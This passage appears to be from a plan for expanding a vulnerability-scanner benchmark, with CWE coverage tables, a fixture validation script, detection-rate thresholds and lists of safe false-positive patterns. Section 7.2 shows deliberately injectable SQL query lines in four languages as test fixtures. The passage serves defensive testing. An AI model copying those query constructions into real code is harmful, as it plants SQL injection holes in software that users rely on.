| CWE-295 (Improper Cert) | | | gt-231 | gt-272 | |
| CWE-90 (LDAP Injection) | | gt-194 | | gt-252 | |
| CWE-643 (XPath Injection) | | | | gt-273 | |
| CWE-1333 (Regex DoS) | | | | gt-274 | |

### 7.2 Shared Fixture Patterns

The same logical vulnerability must be expressed idiomatically in each language. For SQLi:

- **TS/JS**: `` db.query(`SELECT * FROM users WHERE id = '${req.query.id}'`) ``
- **Python**: `cur.execute(f"SELECT * FROM users WHERE id = '{uid}'")`
- **Go**: `db.QueryRow("SELECT * FROM users WHERE id = '" + id + "'")`
- **Java**: `stmt.executeQuery("SELECT * FROM users WHERE id = '" + id + "'")`

Same vulnerability, language-idiomatic construction.

---

## 8. Validation

### 8.1 Validation Script

Create `eval/validate_all.py` to replace the current TS/JS-only validation with multi-language support:

```python
# eval/validate_all.py
"""Validate all ground truth fixtures compile/parse and GT YAML is well-formed."""
from __future__ import annotations
import subprocess, sys, yaml
from pathlib import Path
from eval.ground_truth.schema import GroundTruthEntry

FIXTURES = Path(__file__).parent / "fixtures"
GT_DIR = Path(__file__).parent / "ground_truth"

LANG_VALIDATORS = {
    "python": lambda p: subprocess.run([sys.executable, "-m", "py_compile", str(p)], capture_output=True).returncode == 0,
    "go": lambda p: subprocess.run(["go", "vet", str(p)], capture_output=True).returncode == 0,
    "java": lambda p: subprocess.run(["javac", "-d", "/tmp", str(p)], capture_output=True).returncode == 0,
    "typescript": lambda p: subprocess.run(["npx", "tsc", "--noEmit", str(p)], capture_output=True).returncode == 0,
}

def validate_yaml_entries():
    errors = []
    for f in sorted(GT_DIR.glob("gt-*.yaml")):
        with open(f) as fh:
            data = yaml.safe_load(fh)
        try:
            GroundTruthEntry(**data)
        except Exception as e:
            errors.append(f"{f.name}: {e}")
    return errors

def validate_fixtures():
    errors = []
    for lang, validator in LANG_VALIDATORS.items():
        lang_dir = FIXTURES / lang
        if not lang_dir.exists():
            errors.append(f"Missing fixture directory: {lang_dir}")
            continue
        for f in lang_dir.rglob("*"):
            if f.is_file() and f.suffix in (".py", ".go", ".java", ".ts"):
                if not validator(f):
                    errors.append(f"Fixture failed validation: {f}")
    return errors

def validate_coverage():
    """Check per-language and per-CWE coverage meets minimums."""
    entries_by_lang = {"python": 0, "go": 0, "java": 0, "typescript": 0}
    entries_by_cwe: dict[str, int] = {}
    for f in sorted(GT_DIR.glob("gt-*.yaml")):
        with open(f) as fh:
            data = yaml.safe_load(fh)
        for af in data.get("affected_files", []):
            if af.startswith("eval/fixtures/python") or "flask" in af or "django" in af or "fastapi" in af:
                entries_by_lang["python"] += 1
            elif af.startswith("eval/fixtures/go") or "/gin/" in af or "/echo/" in af or "/chi/" in af:
                entries_by_lang["go"] += 1
            elif af.startswith("eval/fixtures/java") or "/spring/" in af or "/servlet/" in af:
                entries_by_lang["java"] += 1
            else:
                entries_by_lang["typescript"] += 1
        cwe = data.get("cwe_id", "")
        entries_by_cwe[cwe] = entries_by_cwe.get(cwe, 0) + 1
    issues = []
    for lang, count in entries_by_lang.items():
        if lang != "typescript" and count < 30:
            issues.append(f"{lang}: only {count} entries (need >= 30)")
    return entries_by_lang, entries_by_cwe, issues

if __name__ == "__main__":
    yaml_errors = validate_yaml_entries()
    fixture_errors = validate_fixtures()
    lang_counts, cwe_counts, coverage_issues = validate_coverage()
    print(f"YAML entries validated: {len(list(GT_DIR.glob('gt-*.yaml')))}")
    print(f"YAML errors: {len(yaml_errors)}")
    for e in yaml_errors:
        print(f"  {e}")
    print(f"Fixture errors: {len(fixture_errors)}")
    for e in fixture_errors:
        print(f"  {e}")
    print(f"Coverage by language: {lang_counts}")
    print(f"Coverage by CWE: {dict(sorted(cwe_counts.items()))}")
    for i in coverage_issues:
        print(f"  WARNING: {i}")
    sys.exit(1 if yaml_errors or fixture_errors or coverage_issues else 0)
```

### 8.2 Detection Rate Thresholds

| Language | Minimum Detection Rate | Action if Below |
|----------|----------------------|-----------------|
| TS/JS | 80% | Regression — block release |
| Python | 70% | File issues for missing Python specs |
| Go | 70% | File issues for missing Go specs |
| Java | 70% | File issues for missing Java specs |

Detection rate = (true positives correctly detected) / (total true positive GT entries for language).

### 8.3 Per-CWE Minimum Samples

After this phase, every CWE with piranesi detection support must have n >= 10 GT entries across all languages. CWEs with n < 10 must have filed issues tracking additional GT creation.

---

## 9. False Positive Entries (gt-fp-040 through gt-fp-069)

30 new FP entries covering safe patterns in Python, Go, and Java:

| Range | Language | Patterns |
|-------|----------|----------|
| gt-fp-040 to gt-fp-049 | Python | Parameterized `cursor.execute(sql, params)`, `shlex.quote()`, `markupsafe.escape()`, Django ORM `.filter()`, Pydantic-validated inputs, `bleach.clean()`, `os.path.realpath()` check, `hmac.compare_digest()`, `secrets.token_hex()`, allowlisted subprocess args |
| gt-fp-050 to gt-fp-059 | Go | `db.Query(sql, args...)`, `html/template` auto-escape, `filepath.Clean()` + prefix check, `crypto/subtle.ConstantTimeCompare()`, `net/url.Parse()` validation, CSRF middleware present, `exec.Command` with hardcoded args, `strconv.Atoi()` type guard, `strings.HasPrefix()` allowlist, `template.HTMLEscapeString()` |
| gt-fp-060 to gt-fp-069 | Java | `PreparedStatement` with `?` placeholders, Spring `@Valid` + DTO, `ESAPI.encoder().encodeForHTML()`, `DocumentBuilderFactory` with DTD disabled, `MessageDigest.isEqual()`, Spring Security CSRF enabled, `SecureRandom`, `Paths.get().normalize().startsWith()`, `org.owasp.html.PolicyFactory`, allowlisted `Runtime.exec` args |

---

## 10. Acceptance Criteria

- [ ] 160+ new ground truth YAML entries (gt-145 through gt-304, gt-fp-040 through gt-fp-069)
- [ ] 50 Python entries covering Flask, Django, FastAPI, general Python
- [ ] 40 Go entries covering Gin, Echo, Chi, net/http stdlib
- [ ] 40 Java entries covering Spring Boot, Servlet, general Java
- [ ] 30 advanced pattern entries covering race conditions, business logic, multi-step chains, second-order injection, prototype pollution, timing attacks
- [ ] 30 new false positive entries across Python, Go, Java
- [ ] All fixtures compile/parse in their respective languages
- [ ] `eval/validate_all.py` passes with zero errors
- [ ] Coverage matrix has no empty cells for supported CWE × language combinations
- [ ] Per-language detection rate >= 70% for Python, Go, Java
- [ ] Per-language detection rate >= 80% for TS/JS (no regression)
- [ ] n >= 10 GT entries per supported CWE across all languages
- [ ] All YAML entries conform to `eval/ground_truth/schema.py` schema
- [ ] Both vulnerable and patched (FP) versions exist for each major pattern

---

## 11. Implementation Order

| Step | Work | Estimated Hours | Parallelizable |
|------|------|----------------|----------------|
| 1 | Create `eval/fixtures/` directory structure | 1h | No |
| 2 | Write Python fixtures (50 files) | 15h | Yes (by framework) |
| 3 | Write Go fixtures (40 files) | 15h | Yes (by framework) |
| 4 | Write Java fixtures (40 files) | 15h | Yes (by framework) |
| 5 | Write advanced pattern fixtures (30 files) | 12h | Yes (by pattern type) |
| 6 | Write all GT YAML entries (190 files) | 20h | Yes (by language) |
| 7 | Write FP YAML entries (30 files) | 8h | Yes (by language) |
| 8 | Implement `eval/validate_all.py` | 4h | No |
| 9 | Run validation, fix broken fixtures | 5h | No |
| 10 | Run piranesi against all fixtures, measure detection rates | 5h | No |
| 11 | File issues for detection gaps found | 2h | No |

**Critical path**: Steps 1 → (2,3,4,5 parallel) → 6,7 → 8 → 9 → 10 → 11
